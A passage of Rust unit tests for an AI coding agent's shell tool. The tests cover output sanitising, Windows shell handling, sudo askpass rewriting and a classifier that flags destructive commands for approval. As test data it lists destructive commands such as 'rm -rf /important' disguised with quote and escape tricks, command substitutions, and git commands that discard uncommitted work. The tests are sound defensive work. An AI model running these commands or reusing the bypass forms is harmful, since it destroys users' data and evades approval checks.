    assert_eq!(
        got.get("SSH_ASKPASS_REQUIRE").map(String::as_str),
        Some("force")
    );
    assert_eq!(
        got.get("ATOMCODE_ASKPASS_SOCK").map(String::as_str),
        Some("/run/x.sock")
    );
    assert_eq!(
        got.get("ATOMCODE_ASKPASS_TOKEN").map(String::as_str),
        Some("tok")
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use atomcode_kernel::tool::ToolContext;

    // `run_shell` — the streaming shell executor (owned here since bridge's `!cmd` handler
    // moved off `core::tool::bash`). Direct unit coverage of capture/exit/streaming/UTF-8.
    #[tokio::test]
    async fn run_shell_captures_stdout_and_exit_zero() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_shell("echo hello", dir.path(), 30, |_| {}).await;
        assert!(matches!(
            outcome.exit,
            ShellExit::Exited {
                success: true,
                code: Some(0)
            }
        ));
        assert!(
            outcome.stdout.contains("hello"),
            "stdout was: {:?}",
            outcome.stdout
        );
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))] // `>&2` redirect + `;` sequencing are bash-isms (cmd.exe differs)
    async fn run_shell_captures_stderr_and_nonzero_exit() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_shell("echo boom >&2; exit 2", dir.path(), 30, |_| {}).await;
        match outcome.exit {
            ShellExit::Exited { success, code } => {
                assert!(!success);
                assert_eq!(code, Some(2));
            }
            _ => panic!("expected Exited, got other variant"),
        }
        assert!(
            outcome.stderr.contains("boom"),
            "stderr was: {:?}",
            outcome.stderr
        );
    }

    #[tokio::test]
    async fn run_shell_streams_chunks() {
        use std::sync::{Arc, Mutex};
        let dir = tempfile::tempdir().unwrap();
        let seen = Arc::new(Mutex::new(String::new()));
        let seen2 = seen.clone();
        let outcome = run_shell("echo streamed", dir.path(), 30, move |c| {
            seen2.lock().unwrap().push_str(c);
        })
        .await;
        assert!(matches!(
            outcome.exit,
            ShellExit::Exited { success: true, .. }
        ));
        assert!(seen.lock().unwrap().contains("streamed"));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))] // uses `sleep`; exercises the pgroup terminate() path
    async fn run_shell_hard_timeout_kills_and_reports() {
        // A command that outlives `timeout_secs` must be killed and reported as KilledTimeout —
        // covers the wall-clock-timeout branch + `PgroupChild::terminate()` (SIGTERM→SIGKILL).
        let dir = tempfile::tempdir().unwrap();
        let outcome = run_shell("sleep 5", dir.path(), 1, |_| {}).await;
        assert!(
            matches!(outcome.exit, ShellExit::KilledTimeout),
            "expected KilledTimeout, got {:?} after {:.1}s",
            std::mem::discriminant(&outcome.exit),
            outcome.elapsed_secs
        );
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn run_shell_preserves_utf8_paths_when_parent_locale_is_c() {
        let dir = tempfile::tempdir().unwrap();
        let command = r#"
            mkdir -p "产品需求/流水线/帮助文档"
            printf 'line\n' > "产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"
            wc -l "产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"
        "#;

        let _guard = crate::process_utils::EnvVarGuard::new(&["LC_ALL", "LANG", "LC_CTYPE"]);
        std::env::set_var("LC_ALL", "C");
        std::env::set_var("LANG", "C");
        std::env::set_var("LC_CTYPE", "C");
        let outcome = run_shell(command, dir.path(), 30, |_| {}).await;

        assert!(
            outcome
                .stdout
                .contains("产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"),
            "stdout was: {:?}",
            outcome.stdout
        );
    }

    /// PROBE (kept as a living record): dumps the node kinds tree-sitter-bash produces
    /// for representative commands, so ALLOWED_KINDS in `is_read_only_bash` is derived
    /// from the ACTUAL grammar, not guessed. Asserts the kinds we depend on exist.
    #[test]
    fn probe_bash_node_kinds() {
        fn kinds(cmd: &str) -> Vec<String> {
            let tree = parse_bash(cmd).expect("parse");
            let mut out = Vec::new();
            let mut stack = vec![tree.root_node()];
            while let Some(n) = stack.pop() {
                out.push(n.kind().to_string());
                // tree-sitter 0.26 indexes children by `u32` (child_count is usize).
                for i in 0..n.child_count() as u32 {
                    stack.push(n.child(i).unwrap());
                }
            }
            out.sort();
            out.dedup();
            out
        }
        // Read-only commands: print their kinds so we can read them in test output.
        for cmd in [
            "grep -rn 'pub mod\\|mod ' --include='*.rs' | head -40",
            "cd /a && grep x | head",
            "grep -E 'warning.*(unused|dead_code)' crates/ 2>/dev/null",
            "cat f.txt",
            "ls -la",
            "grep x && grep y",
            "find . -name '*.rs'",
        ] {
            eprintln!("SAFE {:?} -> {:?}", cmd, kinds(cmd));
        }
        // Dangerous commands: print the kind that flags them (must be OUTSIDE the safe set).
        for cmd in [
            "grep \"$(rm -rf x)\"", // command_substitution
            "grep `rm x`",          // command_substitution (backtick)
            "(rm x)",               // subshell
            "grep $HOME",           // expansion / variable
            "ls > out.txt",         // redirect to a real file
            "grep x | tee f",       // tee (allowlist, not node)
        ] {
            eprintln!("DANGER {:?} -> {:?}", cmd, kinds(cmd));
        }
        // LOAD-BEARING: single- vs double-quoted $(...). The whole design depends on the
        // grammar distinguishing a single-quoted literal `'$(rm)'` (raw_string, NO
        // command_substitution child) from a double-quoted `"$(rm)"` that actually
        // executes (a command_substitution node appears).
        eprintln!(
            "QUOTE single {:?} -> {:?}",
            "grep '$(rm)'",
            kinds("grep '$(rm)'")
        );
        eprintln!(
            "QUOTE double {:?} -> {:?}",
            "grep \"$(rm)\"",
            kinds("grep \"$(rm)\"")
        );

        // Assert the kinds we hardcode in Task 2 actually appear (adjust names in Task 2
        // to whatever THIS prints — codex uses program/list/pipeline/command/command_name/
        // word/string/raw_string/string_content/concatenation; bash 0.25.1 may differ).
        let ro = kinds("cd /a && grep x | head");
        assert!(
            ro.iter().any(|k| k == "command"),
            "must have a `command` kind: {ro:?}"
        );
        assert!(
            ro.iter().any(|k| k == "command_name"),
            "must have `command_name`: {ro:?}"
        );
        let sub = kinds("grep \"$(rm x)\"");
        assert!(
            sub.iter().any(|k| k == "command_substitution"),
            "subst kind: {sub:?}"
        );
        // The load-bearing distinction, asserted (not merely printed).
        let single = kinds("grep '$(rm)'");
        assert!(
            !single.iter().any(|k| k == "command_substitution"),
            "single-quoted $(...) must NOT parse as command_substitution: {single:?}"
        );
        let double = kinds("grep \"$(rm)\"");
        assert!(
            double.iter().any(|k| k == "command_substitution"),
            "double-quoted $(...) MUST parse as command_substitution: {double:?}"
        );
    }

    #[test]
    fn bash_invocations_follow_syntax_and_include_nested_commands() {
        assert_eq!(
            super::bash_invocations(
                r#"cd app && cargo +nightly test | tee out; echo "$(npm --prefix ui run build)""#
            ),
            Some(vec![
                super::BashInvocation {
                    command: "cd".into(),
                    arguments: vec!["app".into()],
                },
                super::BashInvocation {
                    command: "cargo".into(),
                    arguments: vec!["+nightly".into(), "test".into()],
                },
                super::BashInvocation {
                    command: "tee".into(),
                    arguments: vec!["out".into()],
                },
                super::BashInvocation {
                    command: "echo".into(),
                    arguments: vec![r#""$(npm --prefix ui run build)""#.into()],
                },
                super::BashInvocation {
                    command: "npm".into(),
                    arguments: vec!["--prefix".into(), "ui".into(), "run".into(), "build".into()],
                },
            ])
        );
        assert!(super::bash_invocations("cargo test |").is_none());
    }

    #[test]
    fn sanitize_strips_ansi_colour_codes() {
        // SGR colour/style codes (`ESC [ … m`) must be removed, leaving plain text.
        assert_eq!(
            sanitize_terminal_output("\x1b[32m[PASSED]\x1b[0m done"),
            "[PASSED] done"
        );
        assert_eq!(
            sanitize_terminal_output("\x1b[1;31merror\x1b[39m: boom"),
            "error: boom"
        );
    }

    #[test]
    fn sanitize_collapses_carriage_return_progress_lines() {
        // A `\r` progress rewrite keeps only what the terminal would finally show.
        assert_eq!(
            sanitize_terminal_output("Downloading...\rDownloading 100%"),
            "Downloading 100%"
        );
    }

    #[test]
    fn sanitize_handles_mixed_csi_cr_and_erase() {
        // CSI erase-line (`\x1b[K`) + CSI cursor-up (`\x1b[A`) + `\r` rewrite together.
        assert_eq!(
            sanitize_terminal_output("remote: Checking\x1b[K\r\x1b[A[PASSED]"),
            "[PASSED]"
        );
    }

    #[test]
    fn sanitize_leaves_plain_text_and_tabs_untouched() {
        assert_eq!(sanitize_terminal_output("a\tb\nc"), "a\tb\nc");
        assert_eq!(sanitize_terminal_output(""), "");
    }

    #[test]
    fn sanitize_strips_8bit_c1_csi() {
        // 8-bit C1 CSI introducer U+009B (encoded 0xC2 0x9B) + SGR must be stripped,
        // including its payload — the trailing control filter alone would leave "31m".
        assert_eq!(
            sanitize_terminal_output("\u{9b}31mRED\u{9b}0m done"),
            "RED done"
        );
    }

    #[test]
    fn sanitize_strips_dcs_and_other_string_sequences() {
        // 7-bit DCS: ESC P ... ST(ESC \) — v1 leaked the payload; now fully dropped.
        assert_eq!(
            sanitize_terminal_output("\x1bP1;2|payload\x1b\\visible"),
            "visible"
        );
        // 7-bit APC: ESC _ ... BEL terminator.
        assert_eq!(
            sanitize_terminal_output("\x1b_progress\x07visible"),
            "visible"
        );
        // 8-bit C1 DCS (U+0090) terminated by 8-bit C1 ST (U+009C).
        assert_eq!(
            sanitize_terminal_output("\u{90}data\u{9c}visible"),
            "visible"
        );
        // OSC (7-bit) still works via the shared string consumer (BEL-terminated).
        assert_eq!(
            sanitize_terminal_output("\x1b]0;window title\x07text"),
            "text"
        );
    }

    // End-to-end: format_output must actually run the sanitizer, so a command that
    // emits colour codes never leaks escape sequences into the tool result (model
    // context). Guards against someone dropping the sanitize call from format_output.
    #[tokio::test]
    async fn colour_output_is_stripped_end_to_end() {
        let d = tempfile::tempdir().unwrap();
        let r = BashTool
            .execute(
                r#"{"command":"printf '\\033[31mRED\\033[0m\\n'"}"#,
                &ctx(d.path()),
            )
            .await;
        assert!(!r.is_error, "{}", r.content);
        assert!(r.content.contains("RED"), "content: {:?}", r.content);
        assert!(
            !r.content.contains('\x1b'),
            "escape leaked into result: {:?}",
            r.content
        );
    }

    #[test]
    fn wsl_launcher_excluded_git_bash_and_msys_allowed() {
        use std::path::Path;
        // WSL launcher (System32 / SysWOW64 / Sysnative) — must be rejected.
        assert!(is_wsl_launcher(Path::new(r"C:\Windows\System32\bash.exe")));
        assert!(is_wsl_launcher(Path::new(r"C:\Windows\SysWOW64\bash.exe")));
        assert!(is_wsl_launcher(Path::new(r"C:\Windows\Sysnative\bash.exe")));
        // App-execution-alias: Win10/11 exposes WSL's `bash` as a 0-byte reparse stub
        // under `%LOCALAPPDATA%\Microsoft\WindowsApps\bash.exe`. `where bash` often returns
        // THIS first (WindowsApps is on the user PATH ahead of System32), it `is_file()`,
        // and it launches WSL — so it MUST be rejected too. Installing Docker Desktop
        // (WSL2 backend) enables the alias; if WSL has no working distro, `bash -c` fails.
        assert!(is_wsl_launcher(Path::new(
            r"C:\Users\me\AppData\Local\Microsoft\WindowsApps\bash.exe"
        )));
        // Git Bash / MSYS2 are real shells we CAN use — must NOT be rejected.
        assert!(!is_wsl_launcher(Path::new(
            r"C:\Program Files\Git\bin\bash.exe"
        )));
        assert!(!is_wsl_launcher(Path::new(r"C:\msys64\usr\bin\bash.exe")));
    }

    #[test]
    fn bash_derived_from_git_exe_on_any_drive() {
        use std::path::{Path, PathBuf};
        // Forward slashes so `Path` treats them as separators on the (non-Windows) test host;
        // on real Windows the `where git` input uses backslashes, handled natively.
        // git.exe in `<root>/cmd` (Git for Windows default layout).
        assert_eq!(
            bash_beside_git(Path::new("D:/program/git/cmd/git.exe")),
            Some(PathBuf::from("D:/program/git/bin/bash.exe")),
        );
        // git.exe in `<root>/bin` (alternate layout) → same `bin/bash.exe`.
        assert_eq!(
            bash_beside_git(Path::new("D:/program/git/bin/git.exe")),
            Some(PathBuf::from("D:/program/git/bin/bash.exe")),
        );
        // Too shallow (no grandparent) → None, not a panic.
        assert_eq!(bash_beside_git(Path::new("git.exe")), None);
    }

    #[test]
    fn parse_reg_install_path_extracts_path_with_spaces() {
        let out = "\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\GitForWindows\r\n    InstallPath    REG_SZ    D:\\program\\git\r\n";
        assert_eq!(parse_reg_install_path(out), Some(r"D:\program\git"));
        // Path containing a space survives (everything after REG_SZ is taken).
        let spaced = "    InstallPath    REG_SZ    D:\\my apps\\Git\r\n";
        assert_eq!(parse_reg_install_path(spaced), Some(r"D:\my apps\Git"));
        // No value line → None.
        assert_eq!(parse_reg_install_path("ERROR: key not found\r\n"), None);
    }

    #[test]
    fn unsupported_construct_flags_real_bashisms() {
        assert!(unsupported_bash_construct("echo $(date)").is_some());
        assert!(unsupported_bash_construct("cat <<< hi").is_some());
        assert!(unsupported_bash_construct("wc -l < <(ls)").is_some());
        assert!(unsupported_bash_construct("tee >(cat)").is_some());
    }

    #[test]
    fn unsupported_construct_no_false_positive_on_valid_cmd() {
        // All RUN fine under cmd.exe — the over-broad pre-fix guard wrongly blocked these.
        assert!(unsupported_bash_construct(r#"echo "price is $5""#).is_none()); // bare $
        assert!(unsupported_bash_construct("git commit -m \"use `x`\"").is_none()); // backtick
        assert!(unsupported_bash_construct(r#"python -c "print(1<<4)""#).is_none()); // << bit-shift
        assert!(unsupported_bash_construct("dir && echo ok").is_none()); // && chain
    }
    use tokio_util::sync::CancellationToken;

    fn ctx(dir: &std::path::Path) -> ToolContext {
        ToolContext {
            working_dir: dir.to_path_buf(),
            cancel: CancellationToken::new(),
            progress: atomcode_kernel::tool::ProgressSink::noop(),
            requester: None,
        }
    }
    fn risk_of(cmd: &str) -> RiskLevel {
        BashTool.risk(&serde_json::json!({ "command": cmd }).to_string())
    }

    #[tokio::test]
    #[cfg(unix)]
    async fn execute_preserves_utf8_paths_when_parent_locale_is_c() {
        let d = tempfile::tempdir().unwrap();
        let command = r#"
            mkdir -p "产品需求/流水线/帮助文档"
            printf 'line\n' > "产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"
            wc -l "产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"
        "#;
        let _guard = crate::process_utils::EnvVarGuard::new(&["LC_ALL", "LANG", "LC_CTYPE"]);
        std::env::set_var("LC_ALL", "C");
        std::env::set_var("LANG", "C");
        std::env::set_var("LC_CTYPE", "C");

        let result = BashTool
            .execute(
                &serde_json::json!({ "command": command }).to_string(),
                &ctx(d.path()),
            )
            .await;

        assert!(
            result
                .content
                .contains("产品需求/流水线/帮助文档/GitCode-Action-官网文档.md"),
            "content was: {:?}",
            result.content
        );
    }

    // macOS sudo (and some Linux configs) does NOT auto-use SUDO_ASKPASS just because
    // there is no tty — it needs an explicit `-A`. When the askpass helper is active we
    // rewrite `sudo` command words to `sudo -A` so a plain `sudo` pops our password modal.
    #[cfg(unix)]
    #[test]
    fn rewrite_sudo_inserts_dash_a_only_when_appropriate() {
        // bare sudo in command position → gets -A
        assert_eq!(
            rewrite_sudo_for_askpass("sudo find / -name x"),
            "sudo -A find / -name x"
        );
        // already has -A → unchanged
        assert_eq!(rewrite_sudo_for_askpass("sudo -A find /"), "sudo -A find /");
        // -n (non-interactive: explicit no-prompt) → MUST NOT add -A
        assert_eq!(rewrite_sudo_for_askpass("sudo -n true"), "sudo -n true");
        // -S (read password from stdin) → unchanged
        assert_eq!(
            rewrite_sudo_for_askpass("sudo -S cat /etc/x"),
            "sudo -S cat /etc/x"
        );
        // `sudo` as an argument, not a command → unchanged
        assert_eq!(rewrite_sudo_for_askpass("echo sudo here"), "echo sudo here");
        // after `&&` → command position → rewritten
        assert_eq!(
            rewrite_sudo_for_askpass("cd /x && sudo make install"),
            "cd /x && sudo -A make install"
        );
        // in a pipe → command position → rewritten
        assert_eq!(
            rewrite_sudo_for_askpass("ls | sudo tee f"),
            "ls | sudo -A tee f"
        );
        // `sudo` inside quotes → not a command → unchanged
        assert_eq!(
            rewrite_sudo_for_askpass("grep 'sudo' file"),
            "grep 'sudo' file"
        );
        // other leading flags → -A inserted right after sudo
        assert_eq!(
            rewrite_sudo_for_askpass("sudo -E find /"),
            "sudo -A -E find /"
        );
        // -u takes an arg (root); the command `find` follows → -A inserted, arg not mistaken
        assert_eq!(
            rewrite_sudo_for_askpass("sudo -u root find /"),
            "sudo -A -u root find /"
        );
        // -u root then -n → non-interactive present → unchanged
        assert_eq!(
            rewrite_sudo_for_askpass("sudo -u root -n true"),
            "sudo -u root -n true"
        );
        // two sudo segments → both rewritten
        assert_eq!(
            rewrite_sudo_for_askpass("sudo a; sudo b"),
            "sudo -A a; sudo -A b"
        );
        // no sudo at all → unchanged
        assert_eq!(rewrite_sudo_for_askpass("find / -name x"), "find / -name x");
    }

    // On Windows the `bash` tool routes through Git Bash / MSYS2, where the cmd.exe
    // idiom `> nul` (a reflex models emit to discard output) does NOT hit the null
    // device — `nul` is a plain relative filename, so bash creates a REAL file named
    // `nul` in the cwd. MSYS2 opens via NT-native paths, bypassing Win32's reserved-name
    // guard, so the file is real and undeletable via Explorer / `del nul`. We rewrite the
    // redirect target to `/dev/null` (the model's actual intent) so nothing hits disk.
    #[test]
    fn rewrite_nul_redirect_targets_only() {
        // Bare `> nul` (with and without space) → /dev/null.
        assert_eq!(rewrite_nul_redirect("echo hi > nul"), "echo hi > /dev/null");
        assert_eq!(rewrite_nul_redirect("echo hi >nul"), "echo hi >/dev/null");
        // fd-prefixed and combined forms.
        assert_eq!(rewrite_nul_redirect("foo 2> nul"), "foo 2> /dev/null");
        assert_eq!(rewrite_nul_redirect("foo 2>nul"), "foo 2>/dev/null");
        assert_eq!(rewrite_nul_redirect("foo &> nul"), "foo &> /dev/null");
        assert_eq!(rewrite_nul_redirect("foo >> nul"), "foo >> /dev/null");
        assert_eq!(rewrite_nul_redirect("foo 2>>nul"), "foo 2>>/dev/null");
        // Case-insensitive (NUL / Nul).
        assert_eq!(rewrite_nul_redirect("foo > NUL"), "foo > /dev/null");
        assert_eq!(rewrite_nul_redirect("foo >Nul"), "foo >/dev/null");
        // The common `cmd > nul 2>&1` — only the nul target is touched; `2>&1` intact.
        assert_eq!(
            rewrite_nul_redirect("cmd > nul 2>&1"),
            "cmd > /dev/null 2>&1"
        );
        // Trailing separators are boundaries.
        assert_eq!(rewrite_nul_redirect("a > nul; b"), "a > /dev/null; b");
        assert_eq!(rewrite_nul_redirect("a > nul|b"), "a > /dev/null|b");
        // `nul` as an argument, not a redirect target → UNTOUCHED.
        assert_eq!(rewrite_nul_redirect("echo nul"), "echo nul");
        assert_eq!(rewrite_nul_redirect("grep nul file"), "grep nul file");
        // `nul` with a suffix is a different file → not a bare device name → untouched.
        assert_eq!(rewrite_nul_redirect("cat > nul.txt"), "cat > nul.txt");
        assert_eq!(rewrite_nul_redirect("cat > nully"), "cat > nully");
        // Inside quotes the target is literal / user-intended → untouched.
        assert_eq!(rewrite_nul_redirect("echo 'a > nul'"), "echo 'a > nul'");
        assert_eq!(
            rewrite_nul_redirect(r#"echo "a > nul""#),
            r#"echo "a > nul""#
        );
        // A real target that merely follows a redirect is untouched (not nul).
        assert_eq!(rewrite_nul_redirect("foo > out.log"), "foo > out.log");
        // No redirect at all → borrowed, no allocation.
        assert!(matches!(
            rewrite_nul_redirect("ls -la"),
            std::borrow::Cow::Borrowed(_)
        ));
        // Multibyte content survives the byte-level scan.
        assert_eq!(
            rewrite_nul_redirect("echo 你好 > nul"),
            "echo 你好 > /dev/null"
        );
        // Heredoc present → bail entirely: a `> nul` in the body may be verbatim content the
        // model is writing (e.g. a .bat where `nul` is the real cmd.exe device). Must NOT be
        // mutated — a possible stray file beats silently corrupting written content.
        let heredoc = "cat > build.bat <<'EOF'\ncl a.c > nul\nEOF";
        assert_eq!(rewrite_nul_redirect(heredoc), heredoc);
    }

    // On Windows the description must explicitly tell the model it runs via
    // cmd.exe (not bash) and steer it away from bash-only syntax — otherwise the
    // model follows the `bash` tool name and emits heredocs / $(...) / single-quote
    // quoting that cmd.exe can't parse, then thrashes into temp-file workarounds.
    #[test]
    fn windows_description_steers_to_cmd_not_bash() {
        let win = shell_tool_description(true, false, false);
        assert!(win.contains("cmd.exe"), "windows desc must name cmd.exe");
        let lc = win.to_lowercase();
        assert!(
            lc.contains("not bash"),
            "windows desc must say it is not bash"
        );
        assert!(
            lc.contains("heredoc"),
            "windows desc must warn off heredocs"
        );
        assert!(
            win.contains("$("),
            "windows desc must warn off command substitution"
        );

        let unix = shell_tool_description(false, false, false);
        assert!(
            !unix.contains("cmd.exe"),
            "unix desc must not mention cmd.exe"
        );
    }

    // The reported Windows pain: the model thrashes across cmd / pwsh / git-bash
    // (`pwsh -Command`, `cmd //c`, `dir`) and mishandles spaced paths
    // (`if exist "C:\Program Files"` wrongly reported as not existing). The
    // description must (a) pin a single shell, (b) demand quoting spaced paths,
    // and (c) steer file ops to the native read_file/grep/glob tools.
    #[test]
    fn windows_description_discourages_shell_mixing_and_steers_to_native_tools() {
        let win = shell_tool_description(true, false, false);
        let lc = win.to_lowercase();
        // Don't switch shells: cmd.exe only, no PowerShell, no git-bash `cmd //c`.
        assert!(
            lc.contains("powershell") || lc.contains("pwsh"),
            "must warn off PowerShell: {win}"
        );
        assert!(
            win.contains("//c"),
            "must warn off git-bash `cmd //c`: {win}"
        );
        // Quote paths containing spaces.
        assert!(
            win.contains(r#""C:\Program Files""#),
            "must show quoting a spaced path: {win}"
        );
        // Prefer atomcode's native file tools over shell file ops.
        assert!(win.contains("glob"), "must steer to glob: {win}");
        assert!(win.contains("grep"), "must steer to grep: {win}");
        assert!(win.contains("read_file"), "must steer to read_file: {win}");
        // The unix description stays lean (no Windows shell noise).
        let unix = shell_tool_description(false, false, false);
        assert!(
            !unix.contains("PowerShell") && !unix.contains("//c"),
            "unix desc unchanged: {unix}"
        );
    }

    // THE FIX: when a POSIX bash (Git Bash / MSYS2) is actually present, `build_command`
    // routes the command through `bash -c` — so the description must tell the model the
    // TRUTH (it's bash), not the old hard-coded "cmd.exe" lie. Otherwise the model, told
    // cmd.exe, emits `dir C:\Windows` / `%VAR%` / `type` which then run in bash and break.
    #[test]
    fn windows_with_bash_present_tells_model_bash_not_cmd() {
        let d = shell_tool_description(true, true, false);
        let lc = d.to_lowercase();
        // Must NOT claim cmd.exe / demand cmd-only syntax when bash is what runs.
        assert!(
            !lc.contains("run via cmd.exe") && !lc.contains("use cmd.exe syntax"),
            "must not tell the model cmd.exe when a POSIX bash actually runs: {d}"
        );
        // Must name the real shell and permit bash syntax.
        assert!(
            lc.contains("git bash") || lc.contains("posix bash"),
            "must name the real shell (Git Bash / POSIX bash): {d}"
        );
        assert!(
            lc.contains("bash syntax") || lc.contains("bash-c") || lc.contains("bash -c"),
            "must tell the model bash syntax is fine: {d}"
        );
        // Must warn about Windows path backslashes (bash treats `\\` as escape) and steer
        // to forward-slash / POSIX form — the concrete thing that breaks `dir C:\\Windows`.
        assert!(
            lc.contains("forward slash") || lc.contains("/c/") || lc.contains("c:/"),
            "must steer to forward-slash / POSIX paths: {d}"
        );
        // Base steering (native file tools) still present.
        assert!(
            d.contains("read_file") && d.contains("glob"),
            "base steering retained: {d}"
        );
        // Must steer output-discard to /dev/null, NOT `nul`: under Git Bash `> nul`
        // creates a stray, undeletable file (we also rewrite it defensively).
        assert!(
            lc.contains("/dev/null"),
            "must tell the model to discard via /dev/null: {d}"
        );
        assert!(
            lc.contains("nul"),
            "must warn against the `nul` redirect target: {d}"
        );
    }

    // With NO bash present, cmd.exe IS what runs — the description must keep the cmd.exe
    // guidance (unchanged from before the fix).
    #[test]
    fn windows_without_bash_keeps_cmd_guidance() {
        let d = shell_tool_description(true, false, false);
        assert!(d.contains("cmd.exe"), "no bash → cmd.exe guidance: {d}");
        assert!(
            d.contains("$("),
            "cmd guidance warns off command substitution: {d}"
        );
    }

    // The system-prompt `Shell:` line must report the same shell the tool uses.
    #[test]
    fn windows_shell_label_matches_actual_shell() {
        assert_eq!(
            windows_shell_label(true),
            "bash",
            "bash present → report bash"
        );
        assert_eq!(
            windows_shell_label(false),
            "cmd.exe",
            "no bash → report cmd.exe"
        );
    }

    // Previously the unix description said NOTHING about preferring the dedicated file
    // tools, so on macOS/Linux the only steering lived in the persona — far from the
    // model's tool-choice decision point. Weak models (GLM-5.2) shell out `ls`/`grep`
    // anyway. Mirror opencode: put the "don't shell out for file ops" guidance in the
    // bash tool's OWN description, on EVERY platform — and keep an explicit carve-out so
    // audit-style pipelines (wc/sort/uniq/git log) still legitimately use bash.
    #[test]
    fn unix_description_steers_file_ops_to_native_tools() {
        let unix = shell_tool_description(false, false, false);
        for tool in ["read_file", "grep", "glob", "list_directory"] {
            assert!(
                unix.contains(tool),
                "unix desc must steer to {tool}: {unix}"
            );
        }
        let lc = unix.to_lowercase();
        assert!(
            lc.contains("aggregation") || lc.contains("pipeline"),
            "must carve out shell pipelines/aggregation for bash: {unix}"
        );
        assert!(
            !unix.contains("cmd.exe"),
            "unix desc must not mention cmd.exe"
        );
    }

    #[test]
    fn askpass_active_advertises_interactive_password_support() {
        // With askpass wired (Unix TUI) the model is told ssh/sudo password
        // prompts work, so it runs them instead of assuming non-interactive.
        let with = shell_tool_description(false, false, true);
        assert!(with.contains("Interactive password prompts ARE supported"));
        assert!(with.contains("ssh user@host"));
        assert!(with.contains("BatchMode"));
        // Interactive commands block on the prompt → steer toward a larger timeout.
        assert!(with.contains("timeout"));
        // Off (webui/headless) it must NOT advertise a prompt that can't appear.
        let without = shell_tool_description(false, false, false);
        assert!(!without.contains("Interactive password prompts ARE supported"));
        // Windows never advertises it (askpass is Unix-only) even if asked to.
        let win = shell_tool_description(true, false, true);
        assert!(!win.contains("Interactive password prompts ARE supported"));
    }

    #[test]
    fn safe_commands_are_safe() {
        for c in [
            "ls -la",
            "cat foo.txt",
            "echo hi",
            "grep -rn TODO .",
            "cargo build",
            "git status",
            "git commit -m wip",
            "rm -rf node_modules",
            "rm -rf target dist",
            "cd if=/dev/foo", // dd false-positive must NOT fire (not a dd command)
            "cargo run -- migrate up", // ORM non-reset verb stays Safe
        ] {
            assert_eq!(risk_of(c), RiskLevel::Safe, "{c} should be Safe");
        }
    }

    #[test]
    fn comment_does_not_trigger_destructive_false_positive() {
        // A `#…` note must not be read as a command by the substring classifier.
        assert!(check_destructive_command("sleep 1 # kill -9 fallback").is_none());
        assert!(
            check_destructive_command("taskkill //F //IM WinNFSd.exe 2>/dev/null # rm -rf cache")
                .is_none(),
            "the reported taskkill+comment case must not be flagged destructive"
        );
        // Real destructive commands are STILL flagged (strip only removes comments). Use a
        // non-artifact target — `build/`, `dist/` etc. are intentionally allowed as artifact cleanup.
        assert!(check_destructive_command("rm -rf my-important-data # cleanup").is_some());
        // A `#` inside quotes is NOT a comment → the substring is still seen (pre-existing limit).
        assert!(check_destructive_command("echo 'kill -9'").is_some());
        // `#` mid-word is not a comment boundary.
        assert_eq!(
            strip_bash_comments("git commit -m foo#bar"),
            "git commit -m foo#bar"
        );
        assert_eq!(strip_bash_comments("rm x # note"), "rm x ");
    }

    #[test]
    fn backslash_escape_does_not_over_strip_into_a_bypass() {
        // Regression: comment-stripping must NEVER remove text bash would EXECUTE, or a destructive
        // command hides from the substring classifier and runs with no approval.
        //
        // (1) Escaped `"` inside a double-quoted string keeps the string open in bash, so the `;`
        //     after the real closing quote still separates a runnable `rm -rf`. The stripper must
        //     not close the quote at `\"` (which would make the tail look "unquoted" and get eaten).
        assert!(
            check_destructive_command(r#""a\"b # x" ; rm -rf /important"#).is_some(),
            "escaped-quote desync must not let rm -rf escape classification"
        );
        assert!(strip_bash_comments(r#""a\"b # x" ; rm -rf /important"#).contains("rm -rf"));
        // (2) Unquoted `\;` is a literal char in bash, not a separator, so `#` right after it is
        //     mid-word (not a comment) — the trailing `;rm -rf /` still runs.
        assert!(
            check_destructive_command(r"echo \;#;rm -rf /important").is_some(),
            "escaped-semicolon must not create a spurious comment boundary that eats rm -rf"
        );
        // (3) Escaped `\#` is a literal `#`, never a comment — following text is preserved.
        assert_eq!(
            strip_bash_comments(r"echo \# rm -rf /important"),
            r"echo \# rm -rf /important"
        );
    }

    #[test]
    fn always_grant_scope_is_stable_across_cosmetic_variation() {
        let key = |cmd: &str| BashTool.always_grant_scope(&json!({ "command": cmd }).to_string());
        // Same command, different trailing comment + whitespace → SAME grant key (so "always" sticks).
        assert_eq!(
            key("taskkill //F //IM X.exe  # attempt 1"),
            key("taskkill //F //IM X.exe # attempt 2")
        );
        assert_eq!(key("rm  foo.txt   # a"), key("rm foo.txt # b"));
        assert_eq!(key("rm foo.txt # a"), "rm foo.txt");
        // A genuinely different command → different key (stays per-command, no family blanket).
        assert_ne!(key("rm foo.txt"), key("rm bar.txt"));
    }

    #[test]
    fn git_checkout_restore_discarding_worktree_is_destructive() {
        // The reported data-loss footgun: `git checkout <file>` / `git restore <file>` silently
        // discard uncommitted work. They MUST classify destructive (→ Risky → approval).
        for c in [
            "git checkout src/main.rs",
            "git checkout .",
            "git checkout -- src/main.rs",
            "git checkout -- .",
            "git checkout HEAD -- src/lib.rs",
            "git checkout -f",
            "git checkout Cargo.toml",
            "git checkout .gitignore",
            "git restore src/main.rs",
            "git restore .",
            "git restore --worktree src/main.rs",
            "cd sub && git checkout src/main.rs", // compound
            "/usr/bin/git checkout .",            // path-qualified
            "git -C /repo checkout .",            // global -C flag before subcommand
            // review-found gaps (all silently discarded work before the hardening):
            "git checkout \"src/main.rs\"", // quoted path
            "git checkout 'src/main.rs'",   // single-quoted path
            "git checkout Makefile",        // extensionless file
            "git checkout Dockerfile",
            "git checkout LICENSE",
            "git checkout src/",                    // whole-directory pathspec
            "git checkout --detach -- src/main.rs", // pathspec despite branch-ish flag
            "git checkout -b tmp -- .",             // pathspec despite -b
            "git switch -f other",                  // switch --force discards
            "git switch --discard-changes main",
            "git reset --hard",   // now via the tokenized helper
            "git reset   --hard", // extra spaces (substring table missed this)
            "git reset --merge HEAD~1",
            "git clean -fd",
            "git clean --force",
